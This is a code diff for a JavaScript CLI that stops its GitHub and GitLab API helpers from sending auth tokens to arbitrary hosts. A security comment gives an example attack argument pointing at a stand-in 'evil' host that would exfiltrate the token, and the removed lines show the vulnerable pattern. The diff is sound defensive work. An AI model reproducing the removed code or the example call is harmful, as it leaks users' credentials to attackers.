@@ -25,8 +25,17 @@ function ghHeaders() {
   if (!token) throw new Error('set GITHUB_TOKEN (or GH_TOKEN) in your env');
   return { Authorization: `Bearer ${token}`, Accept: 'application/vnd.github+json', 'User-Agent': 'orbit-cli' };
 }
-const gh = (p, opts = {}) =>
-  callJson(p.startsWith('http') ? p : `https://api.github.com/${p.replace(/^\//, '')}`, { ...opts, headers: ghHeaders() });
+// SECURITY: resolve against a fixed host and refuse absolute URLs — never send the token to an
+// arbitrary host (a malicious path arg like `get http://evil/x` would otherwise exfiltrate the PAT).
+function ghUrl(p) {
+  if (/^https?:\/\//i.test(p)) {
+    const u = new URL(p);
+    if (u.host !== 'api.github.com') throw new Error(`refusing to send GitHub token to ${u.host}`);
+    return u.toString();
+  }
+  return `https://api.github.com/${String(p).replace(/^\//, '')}`;
+}
+const gh = (p, opts = {}) => callJson(ghUrl(p), { ...opts, headers: ghHeaders() });
 
 // ── GitLab ──
 function glHeaders() {
@@ -34,9 +43,17 @@ function glHeaders() {
   if (!token) throw new Error('set GITLAB_TOKEN in your env');
   return { 'PRIVATE-TOKEN': token };
 }
+const glHost = () => new URL(process.env.GITLAB_URL || 'https://gitlab.com').host;
 const glBase = () => (process.env.GITLAB_URL || 'https://gitlab.com') + '/api/v4';
-const gl = (p, opts = {}) =>
-  callJson(p.startsWith('http') ? p : `${glBase()}/${p.replace(/^\//, '')}`, { ...opts, headers: glHeaders() });
+function glUrl(p) {
+  if (/^https?:\/\//i.test(p)) {
+    const u = new URL(p);
+    if (u.host !== glHost()) throw new Error(`refusing to send GitLab token to ${u.host}`);
+    return u.toString();
+  }
+  return `${glBase()}/${String(p).replace(/^\//, '')}`;
+}
+const gl = (p, opts = {}) => callJson(glUrl(p), { ...opts, headers: glHeaders() });
 const enc = (projectPath) => encodeURIComponent(projectPath);
 
 export function register(api) {
